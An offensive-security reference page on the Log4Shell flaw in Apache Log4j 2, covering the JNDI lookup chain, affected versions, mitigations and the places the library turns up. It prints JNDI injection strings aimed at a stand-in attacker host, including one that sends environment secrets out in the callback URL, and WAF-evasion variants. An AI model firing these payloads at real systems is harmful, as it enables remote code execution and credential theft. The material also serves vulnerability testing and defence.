---
technology: "Apache Log4j 2"
kind: overview
audience: offensive-security
family: java
layer: Java logging library (in-process; no ports of its own)
language: Java
license: "Apache-2.0"
homepage: "https://logging.apache.org/log4j/2.x/"
github-repo: "apache/logging-log4j2"
status: thin
evidence: "2 writeups (command-context gate: ${jndi: payload strings, CVE-2021-44228 citations, rogue LDAP server tooling against the target; excluded as noise: log4j.jar/log4j2.properties directory listings with no attack, and marshalsec/JNDI usage that belongs to java-rmi exploitation) — parent hint of 5 did not survive the gate"
provenance: "corpus-mined from 2 writeups in the writeup corpus + upstream-verified: Apache Logging Services security page (logging.apache.org/security.html — CVE-2021-44228/45046/45105/44832 version ranges and mitigations), Log4j 2.15.0/2.16.0 release announcements (lookup/JNDI default changes). Thin unit treated first-class per standing rule. Pass 2 wave C, 2026-11-12."
---

# Log4j (Log4Shell)

> A logging library whose string-formatting feature resolved `${...}` lookups — including JNDI — inside the text it was told to log, so any user-controlled string that reached a log line could make the server fetch and run code from your LDAP listener. One jar, December 2021, the internet's fire drills for a month.

## What it is

Apache Log4j 2 is the standard logging library of the Java world: applications link `log4j-core`, log messages through it, and it formats them per a `PatternLayout`. The feature that became Log4Shell is the **Lookup**: anywhere the library processes a message (or a pattern, or in some versions exception text), `${scheme:value}` is substituted. Lookups read environment variables (`${env:PATH}`), system properties, date parts — and, until the fixes, **JNDI**: `${jndi:ldap://host/port}` made the process resolve an LDAP/RMI URL and, depending on JDK version, load and instantiate the class the directory served.

That last clause is the entire vulnerability (CVE-2021-44228, "Log4Shell", disclosed 2021-12). What makes it operator-critical is not the mechanism but the surface: **logging is fed by everything an attacker types** — login usernames, User-Agent headers, chat messages, form fields, protocol fields, error traces. Real exploitation has included game-server chat, an FTP greeting, and login forms; the string does not need to be displayed anywhere, only logged.

## The anatomy that matters on an engagement

    attacker string ("${jndi:ldap://ATTACKER_IP:1389/x}")
      -> application logs it via log4j-core (any logger.info/error call)
      -> PatternLayout/message lookup substitutes ${...}
      -> JndiLookup -> JNDI -> LDAP connect to ATTACKER_IP:1389
      -> rogue directory returns a reference (codebase URL) or serialized object
      -> JDK < 8u191/11.0.1: remote class loading  (older boxes: direct RCE)
      -> modern JDK: needs a gadget (e.g. deserialization payload) instead
    defense layers: message lookups off (2.15+), JNDI off (2.16+), WAF string filters

Three structural facts:

- **Only `log4j-core` is vulnerable** — applications using `log4j-api` alone, or Log4j 1.x (no Lookups at all; its own separate issue is CVE-2021-4104 `JMSAppender`), are not Log4Shell-affected. Version identification of the right JAR is the whole game.
- **The JDK version decides exploitability**, not just the library version: modern JDKs block remote codebases from JNDI (`com.sun.jndi.ldap.object.trustURLCodebase=false` since 8u191/11.0.1), so delivery shifts to serialized-object gadgets served over LDAP to targets that have a gadget chain on the classpath.
- **Detection is an interaction problem, not a payload problem** — an out-of-band callback (DNS/LDAP to your listener) fires long before code execution, which is both your canary and your proof of a vulnerable code path.

## Affected-version gating (upstream-verified, Apache Logging Services)

| CVE | What it is | Affected | Fixed |
|---|---|---|---|
| CVE-2021-44228 | JNDI lookup in messages/config/params → RCE | log4j-core `[2.0-beta9, 2.3.1) ∪ [2.4, 2.12.2) ∪ [2.13.0, 2.15.0)` | 2.15.0 (Java 8+), 2.12.2 (Java 7), 2.3.1 (Java 6) |
| CVE-2021-45046 | 2.15.0 fix incomplete in non-default configs (Thread Context lookups) → RCE in some envs | 2.15.0, 2.12.2 | 2.16.0, 2.12.3 |
| CVE-2021-45105 | recursive lookup → DoS | 2.16.0, 2.12.3 | 2.17.0, 2.12.4 |
| CVE-2021-44832 | JDBC Appender JNDI (config-file write required) | ≤2.17.0 | 2.17.1, 2.12.4 |

Mitigations that matter to an operator reading a "patched" claim: from 2.15.0 message lookups are off by default (only `%m{lookups}` re-enables); from 2.16.0 JNDI is disabled by default and message-lookup support removed; the `log4j2.formatMsgNoLookups=true` system property only helps on 2.10–2.14. A box running 2.15.0 is NOT done — 45046/45105 followed. Log4j 1.x is EOL and never gets these fixes.

## Where you'll meet it

- **Any Java process that logs attacker text**: game servers (the Minecraft server exploitation of 2021 was the canonical demo), SIEM/monitoring panels, fleet-management and virtualization consoles, industrial UIs, FTP/mail gateways that log greetings and headers, legacy enterprise portals. If it is Java and it has an input field or an HTTP header path, it is a candidate.
- **Shaded/fat JARs**: the vulnerable class is inside `log4j-core-*.jar` nested in an application bundle — version fingerprinting must look inside the bundle, not at top-level libs.
- **Second-order surfaces**: strings that get logged asynchronously (audit queues, chat relays, exception messages triggered by malformed input).

## Reading the framework's mind

1. **The payload only needs to be LOGGED, not reflected** — blind injection is the normal case; hunt with out-of-band canaries, not response diffing.
2. **Nested lookups work**: `${jndi:ldap://ATTACKER_IP/a=${env:SECRET}}` exfiltrates environment variables inside the callback URL even when code execution is blocked — credential leakage without RCE.
3. **Obfuscation defeats naive WAF rules**: `${${lower:j}ndi:`, `${${::-j}ndi:`, whitespace/case variants — the grammar is recursive by design.
4. **The right question is "which log4j-core, which JDK"** — both gates decide everything (see the methodology file for the fingerprinting paths).
5. **"Patched to 2.15" is not patched** — the CVE chain continued to 2.17.1.

## Where to go next

[[log4j-bug-bounty|Log4j bug bounty methodology]] — canary-first probing, payload variants, version/JDK fingerprinting, rogue LDAP setup, and post-exploitation.
